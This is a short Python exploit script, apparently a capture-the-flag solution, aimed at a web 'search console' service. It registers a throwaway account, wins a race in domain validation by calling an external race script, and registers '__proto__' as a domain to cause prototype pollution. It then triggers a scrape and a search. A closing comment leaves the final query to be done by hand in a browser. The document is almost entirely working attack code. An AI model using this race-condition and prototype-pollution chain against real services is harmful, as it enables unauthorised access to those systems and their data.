#!/usr/bin/env python3
from pwn import *
import sys
import json
import requests

proxies = {
  'http': 'http://localhost:8080'
}

search_console, site_search, = sys.argv[1:]

r = requests.post(f"{search_console}/auth/register", json={
    "username": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
    "password": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
})# , proxies=proxies)
r.raise_for_status()
cookies = r.cookies

def get_domains():
    r = requests.get(f"{search_console}/site", cookies=cookies)# , proxies=proxies)
    r.raise_for_status()
    return set(x["domain"] for x in r.json() if not x["pending"])

def race_domain(domain):
    r = requests.post(f"{search_console}/site/register", cookies=cookies, json={
        "domain": domain,
    })# , proxies=proxies)
    r.raise_for_status()

    p = process(["./validate-race.sh", search_console, cookies["user_token"], domain])
    while True:
        sleep(2)
        if domain in get_domains():
            p.kill()
            break

DOMAIN = "localhost:22473"

race_domain("__proto__")
race_domain(DOMAIN)
print(get_domains())

r = requests.post(f"{search_console}/site/scrape", cookies=cookies, json={
    "domain": DOMAIN,
})# , proxies=proxies)

r = requests.get(f"{site_search}/", params={
    "domain": "__proto__",
    "q": "isStale",
})# , proxies=proxies)
r.raise_for_status()

# do the final search query in the browser for the DRAMATIC TENSION (and/or because i couldn't be bothered to write it here)
